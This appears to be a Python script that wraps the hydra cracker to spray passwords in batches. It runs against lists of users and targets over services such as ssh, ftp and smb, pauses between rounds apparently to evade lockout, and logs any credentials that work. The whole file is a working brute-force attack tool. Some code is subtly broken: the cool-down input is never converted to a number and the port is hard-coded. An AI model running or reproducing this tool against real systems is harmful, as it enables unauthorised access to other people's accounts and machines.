import os
#import subprocess
from subprocess import Popen, PIPE
import time
import logging

def countdown(t):
    while t:
        mins, secs = divmod(t, 60)
        timeformat = '{:02d}:{:02d}'.format(mins, secs)
        print(timeformat, end='\r')
        time.sleep(1)
        t -= 1
    print('Goodbye!\n\n\n\n\n')
    
print('''Welcome to the hydra wrapper!

Available services:

adam6500 asterisk afp cisco cisco-enable cvs ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) ncp nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
''')

myService = input('What service are we cracking?')
myUserFile = input('Path to list of users: ')
myTargetFile = input('Path to list of targets: ')
myPassFile = input('Path to list of wordlist: ')
coolDown = input('Cool down time (minutes) between rounds: ')
myCount = int(input('Number of passwords between rounds: '))
myLogFile = input('Path to output log file: ')

##myService = 'ssh'
##myUserFile = r'ssh_root.txt'
##myTargetFile = r'targets.txt'
##myPassFile = r'passwords.txt'
##myLogFile = r'hydra.log'
##coolDown = 1 * 60
##myCount = 2

myUserList = [line.rstrip('\n') for line in open(myUserFile)]
myTargetList = [line.rstrip('\n') for line in open(myTargetFile)]
myPassList = [line.rstrip('\n') for line in open(myPassFile)]
masterPassList = []

logging.basicConfig(filename=myLogFile,level=logging.DEBUG)

logging.info('Length of user list: ' + str(len(myUserList)))
logging.info('Length of target list: ' + str(len(myTargetList)))
logging.info('Length of pass list: ' + str(len(myPassList)))

thisList = []

while len(myPassList) > 0:
    while len(thisList) < myCount:
        try:
            thisPass = myPassList.pop()
        except:
            thisPass = 'Winter 2020!'
        thisList.append(thisPass)
    if len(thisList) == myCount:
        masterPassList.append(thisList)
    else:
        print('Something aint right!')
        exit()
    thisList = []

print(len(masterPassList))

for passList in masterPassList:
      if len(passList) < 2:
          exit()
      else:
          pass

print('Successfully split lists.')

while len(masterPassList) > 0:
    thisPassList = []
    print('Waking up to get new list')
    thisPassList = masterPassList.pop()
    print('Spraying passwords from this list:')
    print(thisPassList)
    while len(thisPassList) > 0:
        thisPassword = thisPassList.pop()
        for user in myUserList:
            for target in myTargetList:
                logging.info(user + '@' + target + ':' + thisPassword)
                runHydra = Popen(["hydra", "-s", "2222", "-l", user, "-p", thisPassword, myService + "://" + target], stdout=PIPE, stderr=PIPE) 
                for i in runHydra.communicate():
                    j = str(i)
                    if "login:" in j:
                        k = j.split(',')
                        logging.info(k[4])
                        print(k[4])
                        logging.info('****')
                    else:
                        pass
                time.sleep(4)
                logging.info('####')
    print('Time to cool down!')
    countdown(coolDown)
